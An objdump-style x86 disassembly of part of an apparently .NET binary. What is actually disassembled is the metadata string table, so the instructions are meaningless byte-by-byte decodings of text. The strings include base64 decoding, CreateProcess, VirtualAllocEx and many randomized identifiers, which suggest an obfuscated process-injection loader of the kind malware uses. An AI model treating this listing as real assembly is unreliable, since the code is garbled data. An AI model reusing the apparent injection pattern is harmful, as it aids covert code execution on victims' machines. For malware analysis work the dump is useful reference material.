1000311a:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
1000311e:	6c                   	insb   (%dx),%es:(%edi)
1000311f:	75 65                	jne    0x10003186
10003121:	54                   	push   %esp
10003122:	79 70                	jns    0x10003194
10003124:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
10003128:	65 72 65             	gs jb  0x10003190
1000312b:	00 53 79             	add    %dl,0x79(%ebx)
1000312e:	73 74                	jae    0x100031a4
10003130:	65 6d                	gs insl (%dx),%es:(%edi)
10003132:	2e 43                	cs inc %ebx
10003134:	6f                   	outsl  %ds:(%esi),(%dx)
10003135:	72 65                	jb     0x1000319c
10003137:	00 43 6f             	add    %al,0x6f(%ebx)
1000313a:	6d                   	insl   (%dx),%es:(%edi)
1000313b:	70 69                	jo     0x100031a6
1000313d:	6c                   	insb   (%dx),%es:(%edi)
1000313e:	65 72 47             	gs jb  0x10003188
10003141:	65 6e                	outsb  %gs:(%esi),(%dx)
10003143:	65 72 61             	gs jb  0x100031a7
10003146:	74 65                	je     0x100031ad
10003148:	64 41                	fs inc %ecx
1000314a:	74 74                	je     0x100031c0
1000314c:	72 69                	jb     0x100031b7
1000314e:	62 75 74             	bound  %esi,0x74(%ebp)
10003151:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10003155:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
1000315c:	62 
1000315d:	75 74                	jne    0x100031d3
1000315f:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10003164:	75 67                	jne    0x100031cd
10003166:	67 61                	addr16 popa
10003168:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
1000316c:	74 74                	je     0x100031e2
1000316e:	72 69                	jb     0x100031d9
10003170:	62 75 74             	bound  %esi,0x74(%ebp)
10003173:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10003177:	6d                   	insl   (%dx),%es:(%edi)
10003178:	56                   	push   %esi
10003179:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10003180:	74 74                	je     0x100031f6
10003182:	72 69                	jb     0x100031ed
10003184:	62 75 74             	bound  %esi,0x74(%ebp)
10003187:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000318b:	73 65                	jae    0x100031f2
1000318d:	6d                   	insl   (%dx),%es:(%edi)
1000318e:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10003192:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
10003199:	72 
1000319a:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
100031a1:	73 73                	jae    0x10003216
100031a3:	65 6d                	gs insl (%dx),%es:(%edi)
100031a5:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
100031a9:	72 61                	jb     0x1000320c
100031ab:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
100031ae:	61                   	popa
100031af:	72 6b                	jb     0x1000321c
100031b1:	41                   	inc    %ecx
100031b2:	74 74                	je     0x10003228
100031b4:	72 69                	jb     0x1000321f
100031b6:	62 75 74             	bound  %esi,0x74(%ebp)
100031b9:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
100031be:	67 65 74 46          	addr16 gs je 0x10003208
100031c2:	72 61                	jb     0x10003225
100031c4:	6d                   	insl   (%dx),%es:(%edi)
100031c5:	65 77 6f             	gs ja  0x10003237
100031c8:	72 6b                	jb     0x10003235
100031ca:	41                   	inc    %ecx
100031cb:	74 74                	je     0x10003241
100031cd:	72 69                	jb     0x10003238
100031cf:	62 75 74             	bound  %esi,0x74(%ebp)
100031d2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100031d6:	73 65                	jae    0x1000323d
100031d8:	6d                   	insl   (%dx),%es:(%edi)
100031d9:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
100031dd:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
100031e4:	69 
100031e5:	6f                   	outsl  %ds:(%esi),(%dx)
100031e6:	6e                   	outsb  %ds:(%esi),(%dx)
100031e7:	41                   	inc    %ecx
100031e8:	74 74                	je     0x1000325e
100031ea:	72 69                	jb     0x10003255
100031ec:	62 75 74             	bound  %esi,0x74(%ebp)
100031ef:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100031f3:	73 65                	jae    0x1000325a
100031f5:	6d                   	insl   (%dx),%es:(%edi)
100031f6:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
100031fa:	6f                   	outsl  %ds:(%esi),(%dx)
100031fb:	6e                   	outsb  %ds:(%esi),(%dx)
100031fc:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10003202:	74 69                	je     0x1000326d
10003204:	6f                   	outsl  %ds:(%esi),(%dx)
10003205:	6e                   	outsb  %ds:(%esi),(%dx)
10003206:	41                   	inc    %ecx
10003207:	74 74                	je     0x1000327d
10003209:	72 69                	jb     0x10003274
1000320b:	62 75 74             	bound  %esi,0x74(%ebp)
1000320e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003212:	73 65                	jae    0x10003279
10003214:	6d                   	insl   (%dx),%es:(%edi)
10003215:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10003219:	65 73 63             	gs jae 0x1000327f
1000321c:	72 69                	jb     0x10003287
1000321e:	70 74                	jo     0x10003294
10003220:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10003227:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
1000322e:	6f                   	outsl  %ds:(%esi),(%dx)
1000322f:	6d                   	insl   (%dx),%es:(%edi)
10003230:	70 69                	jo     0x1000329b
10003232:	6c                   	insb   (%dx),%es:(%edi)
10003233:	61                   	popa
10003234:	74 69                	je     0x1000329f
10003236:	6f                   	outsl  %ds:(%esi),(%dx)
10003237:	6e                   	outsb  %ds:(%esi),(%dx)
10003238:	52                   	push   %edx
10003239:	65 6c                	gs insb (%dx),%es:(%edi)
1000323b:	61                   	popa
1000323c:	78 61                	js     0x1000329f
1000323e:	74 69                	je     0x100032a9
10003240:	6f                   	outsl  %ds:(%esi),(%dx)
10003241:	6e                   	outsb  %ds:(%esi),(%dx)
10003242:	73 41                	jae    0x10003285
10003244:	74 74                	je     0x100032ba
10003246:	72 69                	jb     0x100032b1
10003248:	62 75 74             	bound  %esi,0x74(%ebp)
1000324b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000324f:	73 65                	jae    0x100032b6
10003251:	6d                   	insl   (%dx),%es:(%edi)
10003252:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10003256:	72 6f                	jb     0x100032c7
10003258:	64 75 63             	fs jne 0x100032be
1000325b:	74 41                	je     0x1000329e
1000325d:	74 74                	je     0x100032d3
1000325f:	72 69                	jb     0x100032ca
10003261:	62 75 74             	bound  %esi,0x74(%ebp)
10003264:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003268:	73 65                	jae    0x100032cf
1000326a:	6d                   	insl   (%dx),%es:(%edi)
1000326b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
1000326f:	6f                   	outsl  %ds:(%esi),(%dx)
10003270:	70 79                	jo     0x100032eb
10003272:	72 69                	jb     0x100032dd
10003274:	67 68 74 41 74 74    	addr16 push $0x74744174
1000327a:	72 69                	jb     0x100032e5
1000327c:	62 75 74             	bound  %esi,0x74(%ebp)
1000327f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003283:	73 65                	jae    0x100032ea
10003285:	6d                   	insl   (%dx),%es:(%edi)
10003286:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
1000328a:	6f                   	outsl  %ds:(%esi),(%dx)
1000328b:	6d                   	insl   (%dx),%es:(%edi)
1000328c:	70 61                	jo     0x100032ef
1000328e:	6e                   	outsb  %ds:(%esi),(%dx)
1000328f:	79 41                	jns    0x100032d2
10003291:	74 74                	je     0x10003307
10003293:	72 69                	jb     0x100032fe
10003295:	62 75 74             	bound  %esi,0x74(%ebp)
10003298:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
1000329c:	6e                   	outsb  %ds:(%esi),(%dx)
1000329d:	74 69                	je     0x10003308
1000329f:	6d                   	insl   (%dx),%es:(%edi)
100032a0:	65 43                	gs inc %ebx
100032a2:	6f                   	outsl  %ds:(%esi),(%dx)
100032a3:	6d                   	insl   (%dx),%es:(%edi)
100032a4:	70 61                	jo     0x10003307
100032a6:	74 69                	je     0x10003311
100032a8:	62 69 6c             	bound  %ebp,0x6c(%ecx)
100032ab:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
100032b2:	69 
100032b3:	62 75 74             	bound  %esi,0x74(%ebp)
100032b6:	65 00 53 69          	add    %dl,%gs:0x69(%ebx)
100032ba:	7a 65                	jp     0x10003321
100032bc:	4f                   	dec    %edi
100032bd:	66 00 57 51          	data16 add %dl,0x51(%edi)
100032c1:	6f                   	outsl  %ds:(%esi),(%dx)
100032c2:	4c                   	dec    %esp
100032c3:	77 6a                	ja     0x1000332f
100032c5:	79 42                	jns    0x10003309
100032c7:	6c                   	insb   (%dx),%es:(%edi)
100032c8:	59                   	pop    %ecx
100032c9:	78 64                	js     0x1000332f
100032cb:	73 54                	jae    0x10003321
100032cd:	4c                   	dec    %esp
100032ce:	4c                   	dec    %esp
100032cf:	70 42                	jo     0x10003313
100032d1:	49                   	dec    %ecx
100032d2:	77 32                	ja     0x10003306
100032d4:	72 4a                	jb     0x10003320
100032d6:	57                   	push   %edi
100032d7:	67 00 53 79          	add    %dl,0x79(%bp,%di)
100032db:	73 74                	jae    0x10003351
100032dd:	65 6d                	gs insl (%dx),%es:(%edi)
100032df:	2e 54                	cs push %esp
100032e1:	68 72 65 61 64       	push   $0x64616572
100032e6:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
100032ed:	6f                   	outsl  %ds:(%esi),(%dx)
100032ee:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
100032f5:	73 
100032f6:	74 65                	je     0x1000335d
100032f8:	6d                   	insl   (%dx),%es:(%edi)
100032f9:	2e 52                	cs push %edx
100032fb:	75 6e                	jne    0x1000336b
100032fd:	74 69                	je     0x10003368
100032ff:	6d                   	insl   (%dx),%es:(%edi)
10003300:	65 2e 56             	gs cs push %esi
10003303:	65 72 73             	gs jb  0x10003379
10003306:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
1000330d:	46                   	inc    %esi
1000330e:	72 6f                	jb     0x1000337f
10003310:	6d                   	insl   (%dx),%es:(%edi)
10003311:	42                   	inc    %edx
10003312:	61                   	popa
10003313:	73 65                	jae    0x1000337a
10003315:	36 34 53             	ss xor $0x53,%al
10003318:	74 72                	je     0x1000338c
1000331a:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
10003321:	53                   	push   %ebx
10003322:	74 72                	je     0x10003396
10003324:	69 6e 67 00 50 61 74 	imul   $0x74615000,0x67(%esi),%ebp
1000332b:	68 00 67 65 74       	push   $0x74656700
10003330:	5f                   	pop    %edi
10003331:	4c                   	dec    %esp
10003332:	65 6e                	outsb  %gs:(%esi),(%dx)
10003334:	67 74 68             	addr16 je 0x1000339f
10003337:	00 54 6f 57          	add    %dl,0x57(%edi,%ebp,2)
1000333b:	54                   	push   %esp
1000333c:	44                   	inc    %esp
1000333d:	73 6c                	jae    0x100033ab
1000333f:	56                   	push   %esi
10003340:	4b                   	dec    %ebx
10003341:	4e                   	dec    %esi
10003342:	4b                   	dec    %ebx
10003343:	61                   	popa
10003344:	79 4c                	jns    0x10003392
10003346:	76 58                	jbe    0x100033a0
10003348:	55                   	push   %ebp
10003349:	4a                   	dec    %edx
1000334a:	56                   	push   %esi
1000334b:	6a 00                	push   $0x0
1000334d:	5a                   	pop    %edx
1000334e:	57                   	push   %edi
1000334f:	58                   	pop    %eax
10003350:	62 64 62 76          	bound  %esp,0x76(%edx,%eiz,2)
10003354:	62 57 78             	bound  %edx,0x78(%edi)
10003357:	72 69                	jb     0x100033c2
10003359:	32 54 4e 63          	xor    0x63(%esi,%ecx,2),%dl
1000335d:	63 6a 00             	arpl   %ebp,0x0(%edx)
10003360:	59                   	pop    %ecx
10003361:	55                   	push   %ebp
10003362:	4f                   	dec    %edi
10003363:	67 6b 7a 49 72       	imul   $0x72,0x49(%bp,%si),%edi
10003368:	73 62                	jae    0x100033cc
1000336a:	4a                   	dec    %edx
1000336b:	43                   	inc    %ebx
1000336c:	64 6e                	outsb  %fs:(%esi),(%dx)
1000336e:	44                   	inc    %esp
1000336f:	34 68                	xor    $0x68,%al
10003371:	70 54                	jo     0x100033c7
10003373:	61                   	popa
10003374:	35 49 64 78 6a       	xor    $0x6a786449,%eax
10003379:	00 48 72             	add    %cl,0x72(%eax)
1000337c:	70 71                	jo     0x100033ef
1000337e:	78 56                	js     0x100033d6
10003380:	64 4f                	fs dec %edi
10003382:	48                   	dec    %eax
10003383:	35 68 42 7a 42       	xor    $0x427a4268,%eax
10003388:	37                   	aaa
10003389:	4e                   	dec    %esi
1000338a:	66 46                	inc    %si
1000338c:	4d                   	dec    %ebp
1000338d:	45                   	inc    %ebp
1000338e:	6d                   	insl   (%dx),%es:(%edi)
1000338f:	52                   	push   %edx
10003390:	6b 00 4d             	imul   $0x4d,(%eax),%eax
10003393:	61                   	popa
10003394:	72 73                	jb     0x10003409
10003396:	68 61 6c 00 6b       	push   $0x6b006c61
1000339b:	65 72 6e             	gs jb  0x1000340c
1000339e:	65 6c                	gs insb (%dx),%es:(%edi)
100033a0:	33 32                	xor    (%edx),%esi
100033a2:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
100033a5:	6c                   	insb   (%dx),%es:(%edi)
100033a6:	00 42 76             	add    %al,0x76(%edx)
100033a9:	61                   	popa
100033aa:	43                   	inc    %ebx
100033ab:	52                   	push   %edx
100033ac:	67 4b                	addr16 dec %ebx
100033ae:	50                   	push   %eax
100033af:	71 6c                	jno    0x1000341d
100033b1:	4d                   	dec    %ebp
100033b2:	57                   	push   %edi
100033b3:	65 50                	gs push %eax
100033b5:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
100033b8:	6c                   	insb   (%dx),%es:(%edi)
100033b9:	00 4b 69             	add    %cl,0x69(%ebx)
100033bc:	6c                   	insb   (%dx),%es:(%edi)
100033bd:	6c                   	insb   (%dx),%es:(%edi)
100033be:	00 45 65             	add    %al,0x65(%ebp)
100033c1:	77 4d                	ja     0x10003410
100033c3:	58                   	pop    %eax
100033c4:	55                   	push   %ebp
100033c5:	4c                   	dec    %esp
100033c6:	45                   	inc    %ebp
100033c7:	58                   	pop    %eax
100033c8:	66 42                	inc    %dx
100033ca:	35 46 41 6d 00       	xor    $0x6d4146,%eax
100033cf:	53                   	push   %ebx
100033d0:	79 73                	jns    0x10003445
100033d2:	74 65                	je     0x10003439
100033d4:	6d                   	insl   (%dx),%es:(%edi)
100033d5:	00 52 61             	add    %dl,0x61(%edx)
100033d8:	6e                   	outsb  %ds:(%esi),(%dx)
100033d9:	64 6f                	outsl  %fs:(%esi),(%dx)
100033db:	6d                   	insl   (%dx),%es:(%edi)
100033dc:	00 47 65             	add    %al,0x65(%edi)
100033df:	74 46                	je     0x10003427
100033e1:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
100033e8:	57 
100033e9:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
100033f0:	78 
100033f1:	74 65                	je     0x10003458
100033f3:	6e                   	outsb  %ds:(%esi),(%dx)
100033f4:	73 69                	jae    0x1000345f
100033f6:	6f                   	outsl  %ds:(%esi),(%dx)
100033f7:	6e                   	outsb  %ds:(%esi),(%dx)
100033f8:	00 53 79             	add    %dl,0x79(%ebx)
100033fb:	73 74                	jae    0x10003471
100033fd:	65 6d                	gs insl (%dx),%es:(%edi)
100033ff:	2e 52                	cs push %edx
10003401:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
10003404:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10003409:	6e                   	outsb  %ds:(%esi),(%dx)
1000340a:	00 53 65             	add    %dl,0x65(%ebx)
1000340d:	61                   	popa
1000340e:	72 63                	jb     0x10003473
10003410:	68 4f 70 74 69       	push   $0x6974704f
10003415:	6f                   	outsl  %ds:(%esi),(%dx)
10003416:	6e                   	outsb  %ds:(%esi),(%dx)
10003417:	00 45 78             	add    %al,0x78(%ebp)
1000341a:	63 65 70             	arpl   %esp,0x70(%ebp)
1000341d:	74 69                	je     0x10003488
1000341f:	6f                   	outsl  %ds:(%esi),(%dx)
10003420:	6e                   	outsb  %ds:(%esi),(%dx)
10003421:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
10003425:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
1000342a:	79 49                	jns    0x10003475
1000342c:	6e                   	outsb  %ds:(%esi),(%dx)
1000342d:	66 6f                	outsw  %ds:(%esi),(%dx)
1000342f:	00 56 6d             	add    %dl,0x6d(%esi)
10003432:	6c                   	insb   (%dx),%es:(%edi)
10003433:	53                   	push   %ebx
10003434:	46                   	inc    %esi
10003435:	46                   	inc    %esi
10003436:	76 52                	jbe    0x1000348a
10003438:	68 54 4e 39 44       	push   $0x44394e54
1000343d:	4d                   	dec    %ebp
1000343e:	65 63 47 77          	arpl   %eax,%gs:0x77(%edi)
10003442:	69 6f 00 5a 65 72 6f 	imul   $0x6f72655a,0x0(%edi),%ebp
10003449:	00 53 6c             	add    %dl,0x6c(%ebx)
1000344c:	65 65 70 00          	gs gs jo 0x10003450
10003450:	53                   	push   %ebx
10003451:	41                   	inc    %ecx
10003452:	74 54                	je     0x100034a8
10003454:	61                   	popa
10003455:	6a 50                	push   $0x50
10003457:	52                   	push   %edx
10003458:	4e                   	dec    %esi
10003459:	4a                   	dec    %edx
1000345a:	73 30                	jae    0x1000348c
1000345c:	62 6b 79             	bound  %ebp,0x79(%ebx)
1000345f:	4c                   	dec    %esp
10003460:	61                   	popa
10003461:	79 56                	jns    0x100034b9
10003463:	70 68                	jo     0x100034cd
10003465:	71 00                	jno    0x10003467
10003467:	53                   	push   %ebx
10003468:	79 73                	jns    0x100034dd
1000346a:	74 65                	je     0x100034d1
1000346c:	6d                   	insl   (%dx),%es:(%edi)
1000346d:	2e 4c                	cs dec %esp
1000346f:	69 6e 71 00 56 49 6c 	imul   $0x6c495600,0x71(%esi),%ebp
10003476:	65 79 72             	gs jns 0x100034eb
10003479:	6c                   	insb   (%dx),%es:(%edi)
1000347a:	72 75                	jb     0x100034f1
1000347c:	72 6c                	jb     0x100034ea
1000347e:	49                   	dec    %ecx
1000347f:	7a 72                	jp     0x100034f3
10003481:	65 38 68 72          	cmp    %ch,%gs:0x72(%eax)
10003485:	00 2e                	add    %ch,(%esi)
10003487:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
1000348b:	00 2e                	add    %ch,(%esi)
1000348d:	63 63 74             	arpl   %esp,0x74(%ebx)
10003490:	6f                   	outsl  %ds:(%esi),(%dx)
10003491:	72 00                	jb     0x10003493
10003493:	49                   	dec    %ecx
10003494:	6e                   	outsb  %ds:(%esi),(%dx)
10003495:	74 50                	je     0x100034e7
10003497:	74 72                	je     0x1000350b
10003499:	00 57 46             	add    %dl,0x46(%edi)
1000349c:	56                   	push   %esi
1000349d:	69 71 6e 68 52 30 31 	imul   $0x31305268,0x6e(%ecx),%esi
100034a4:	36 49                	ss dec %ecx
100034a6:	44                   	inc    %esp
100034a7:	73 52                	jae    0x100034fb
100034a9:	73 00                	jae    0x100034ab
100034ab:	47                   	inc    %edi
100034ac:	62 75 42             	bound  %esi,0x42(%ebp)
100034af:	63 46 4d             	arpl   %eax,0x4d(%esi)
100034b2:	73 31                	jae    0x100034e5
100034b4:	52                   	push   %edx
100034b5:	4e                   	dec    %esi
100034b6:	4a                   	dec    %edx
100034b7:	37                   	aaa
100034b8:	79 45                	jns    0x100034ff
100034ba:	7a 37                	jp     0x100034f3
100034bc:	78 6b                	js     0x10003529
100034be:	52                   	push   %edx
100034bf:	61                   	popa
100034c0:	73 00                	jae    0x100034c2
100034c2:	53                   	push   %ebx
100034c3:	79 73                	jns    0x10003538
100034c5:	74 65                	je     0x1000352c
100034c7:	6d                   	insl   (%dx),%es:(%edi)
100034c8:	2e 44                	cs inc %esp
100034ca:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
100034d1:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
100034d8:	74 65                	je     0x1000353f
100034da:	6d                   	insl   (%dx),%es:(%edi)
100034db:	2e 52                	cs push %edx
100034dd:	75 6e                	jne    0x1000354d
100034df:	74 69                	je     0x1000354a
100034e1:	6d                   	insl   (%dx),%es:(%edi)
100034e2:	65 2e 49             	gs cs dec %ecx
100034e5:	6e                   	outsb  %ds:(%esi),(%dx)
100034e6:	74 65                	je     0x1000354d
100034e8:	72 6f                	jb     0x10003559
100034ea:	70 53                	jo     0x1000353f
100034ec:	65 72 76             	gs jb  0x10003565
100034ef:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
100034f6:	73 74                	jae    0x1000356c
100034f8:	65 6d                	gs insl (%dx),%es:(%edi)
100034fa:	2e 52                	cs push %edx
100034fc:	75 6e                	jne    0x1000356c
100034fe:	74 69                	je     0x10003569
10003500:	6d                   	insl   (%dx),%es:(%edi)
10003501:	65 2e 43             	gs cs inc %ebx
10003504:	6f                   	outsl  %ds:(%esi),(%dx)
10003505:	6d                   	insl   (%dx),%es:(%edi)
10003506:	70 69                	jo     0x10003571
10003508:	6c                   	insb   (%dx),%es:(%edi)
10003509:	65 72 53             	gs jb  0x1000355f
1000350c:	65 72 76             	gs jb  0x10003585
1000350f:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
10003516:	62 75 67             	bound  %esi,0x67(%ebp)
10003519:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
10003520:	65 
10003521:	73 00                	jae    0x10003523
10003523:	47                   	inc    %edi
10003524:	65 74 46             	gs je  0x1000356d
10003527:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
1000352e:	6e 
1000352f:	74 61                	je     0x10003592
10003531:	69 6e 73 00 67 65 74 	imul   $0x74656700,0x73(%esi),%ebp
10003538:	5f                   	pop    %edi
10003539:	43                   	inc    %ebx
1000353a:	68 61 72 73 00       	push   $0x737261
1000353f:	43                   	inc    %ebx
10003540:	72 65                	jb     0x100035a7
10003542:	61                   	popa
10003543:	74 65                	je     0x100035aa
10003545:	50                   	push   %eax
10003546:	72 6f                	jb     0x100035b7
10003548:	63 65 73             	arpl   %esp,0x73(%ebp)
1000354b:	73 00                	jae    0x1000354d
1000354d:	43                   	inc    %ebx
1000354e:	6f                   	outsl  %ds:(%esi),(%dx)
1000354f:	6e                   	outsb  %ds:(%esi),(%dx)
10003550:	63 61 74             	arpl   %esp,0x74(%ecx)
10003553:	00 52 65             	add    %dl,0x65(%edx)
10003556:	70 65                	jo     0x100035bd
10003558:	61                   	popa
10003559:	74 00                	je     0x1000355b
1000355b:	4f                   	dec    %edi
1000355c:	62 6a 65             	bound  %ebp,0x65(%edx)
1000355f:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
10003563:	65 6c                	gs insb (%dx),%es:(%edi)
10003565:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
1000356a:	6f                   	outsl  %ds:(%esi),(%dx)
1000356b:	6e                   	outsb  %ds:(%esi),(%dx)
1000356c:	76 65                	jbe    0x100035d3
1000356e:	72 74                	jb     0x100035e4
10003570:	00 4e 65             	add    %cl,0x65(%esi)
10003573:	78 74                	js     0x100035e9
10003575:	00 53 79             	add    %dl,0x79(%ebx)
10003578:	73 74                	jae    0x100035ee
1000357a:	65 6d                	gs insl (%dx),%es:(%edi)
1000357c:	2e 54                	cs push %esp
1000357e:	65 78 74             	gs js  0x100035f5
10003581:	00 55 72             	add    %dl,0x72(%ebp)
10003584:	53                   	push   %ebx
10003585:	43                   	inc    %ebx
10003586:	64 59                	fs pop %ecx
10003588:	57                   	push   %edi
10003589:	6f                   	outsl  %ds:(%esi),(%dx)
1000358a:	62 34 68             	bound  %esi,(%eax,%ebp,2)
1000358d:	36 34 74             	ss xor $0x74,%al
10003590:	4f                   	dec    %edi
10003591:	4d                   	dec    %ebp
10003592:	77 77                	ja     0x1000360b
10003594:	5a                   	pop    %edx
10003595:	72 34                	jb     0x100035cb
10003597:	32 49 75             	xor    0x75(%ecx),%cl
1000359a:	00 41 52             	add    %al,0x52(%ecx)
1000359d:	52                   	push   %edx
1000359e:	6c                   	insb   (%dx),%es:(%edi)
1000359f:	4c                   	dec    %esp
100035a0:	43                   	inc    %ebx
100035a1:	6c                   	insb   (%dx),%es:(%edi)
100035a2:	66 67 5a             	addr16 pop %dx
100035a5:	6c                   	insb   (%dx),%es:(%edi)
100035a6:	47                   	inc    %edi
100035a7:	36 37                	ss aaa
100035a9:	62 38                	bound  %edi,(%eax)
100035ab:	53                   	push   %ebx
100035ac:	4e                   	dec    %esi
100035ad:	50                   	push   %eax
100035ae:	4a                   	dec    %edx
100035af:	75 00                	jne    0x100035b1
100035b1:	4d                   	dec    %ebp
100035b2:	6f                   	outsl  %ds:(%esi),(%dx)
100035b3:	47                   	inc    %edi
100035b4:	45                   	inc    %ebp
100035b5:	75 66                	jne    0x1000361d
100035b7:	6d                   	insl   (%dx),%es:(%edi)
100035b8:	32 70 64             	xor    0x64(%eax),%dh
100035bb:	38 58 4c             	cmp    %bl,0x4c(%eax)
100035be:	49                   	dec    %ecx
100035bf:	74 61                	je     0x10003622
100035c1:	56                   	push   %esi
100035c2:	78 75                	js     0x10003639
100035c4:	00 45 69             	add    %al,0x69(%ebp)
100035c7:	42                   	inc    %edx
100035c8:	62 50 6b             	bound  %edx,0x6b(%eax)
100035cb:	4f                   	dec    %edi
100035cc:	6c                   	insb   (%dx),%es:(%edi)
100035cd:	74 6e                	je     0x1000363d
100035cf:	7a 6c                	jp     0x1000363d
100035d1:	6d                   	insl   (%dx),%es:(%edi)
100035d2:	76 00                	jbe    0x100035d4
100035d4:	49                   	dec    %ecx
100035d5:	4c                   	dec    %esp
100035d6:	4e                   	dec    %esi
100035d7:	43                   	inc    %ebx
100035d8:	67 78 30             	addr16 js 0x1000360b
100035db:	5a                   	pop    %edx
100035dc:	4f                   	dec    %edi
100035dd:	4f                   	dec    %edi
100035de:	47                   	inc    %edi
100035df:	6b 4d 50 77          	imul   $0x77,0x50(%ebp),%ecx
100035e3:	00 55 50             	add    %dl,0x50(%ebp)
100035e6:	43                   	inc    %ebx
100035e7:	46                   	inc    %esi
100035e8:	47                   	inc    %edi
100035e9:	61                   	popa
100035ea:	70 65                	jo     0x10003651
100035ec:	49                   	dec    %ecx
100035ed:	35 45 6d 53 44       	xor    $0x44536d45,%eax
100035f2:	42                   	inc    %edx
100035f3:	51                   	push   %ecx
100035f4:	73 47                	jae    0x1000363d
100035f6:	79 77                	jns    0x1000366f
100035f8:	00 56 69             	add    %dl,0x69(%esi)
100035fb:	72 74                	jb     0x10003671
100035fd:	75 61                	jne    0x10003660
100035ff:	6c                   	insb   (%dx),%es:(%edi)
10003600:	41                   	inc    %ecx
10003601:	6c                   	insb   (%dx),%es:(%edi)
10003602:	6c                   	insb   (%dx),%es:(%edi)
10003603:	6f                   	outsl  %ds:(%esi),(%dx)
10003604:	63 45 78             	arpl   %eax,0x78(%ebp)
10003607:	00 48 70             	add    %cl,0x70(%eax)
1000360a:	54                   	push   %esp
1000360b:	4c                   	dec    %esp
1000360c:	68 61 6b 62 55       	push   $0x55626b61
10003611:	55                   	push   %ebp
10003612:	75 76                	jne    0x1000368a
10003614:	46                   	inc    %esi
10003615:	55                   	push   %ebp
10003616:	6c                   	insb   (%dx),%es:(%edi)
10003617:	41                   	inc    %ecx
10003618:	52                   	push   %edx
10003619:	6d                   	insl   (%dx),%es:(%edi)
1000361a:	61                   	popa
1000361b:	38 64 75 48          	cmp    %ah,0x48(%ebp,%esi,2)
1000361f:	78 00                	js     0x10003621
10003621:	57                   	push   %edi
10003622:	5a                   	pop    %edx
10003623:	74 70                	je     0x10003695
10003625:	75 70                	jne    0x10003697
10003627:	4d                   	dec    %ebp
10003628:	64 38 33             	cmp    %dh,%fs:(%ebx)
1000362b:	31 30                	xor    %esi,(%eax)
1000362d:	75 71                	jne    0x100036a0
1000362f:	7a 61                	jp     0x10003692
10003631:	75 53                	jne    0x10003686
10003633:	71 78                	jno    0x100036ad
10003635:	53                   	push   %ebx
10003636:	56                   	push   %esi
10003637:	78 00                	js     0x10003639
10003639:	50                   	push   %eax
1000363a:	66 4a                	dec    %dx
1000363c:	46                   	inc    %esi
1000363d:	70 63                	jo     0x100036a2
1000363f:	45                   	inc    %ebp
10003640:	35 66 41 58 54       	xor    $0x54584166,%eax
10003645:	4d                   	dec    %ebp
10003646:	79 00                	jns    0x10003648
10003648:	54                   	push   %esp
10003649:	6f                   	outsl  %ds:(%esi),(%dx)
1000364a:	41                   	inc    %ecx
1000364b:	72 72                	jb     0x100036bf
1000364d:	61                   	popa
1000364e:	79 00                	jns    0x10003650
10003650:	43                   	inc    %ebx
10003651:	6f                   	outsl  %ds:(%esi),(%dx)
10003652:	70 79                	jo     0x100036cd
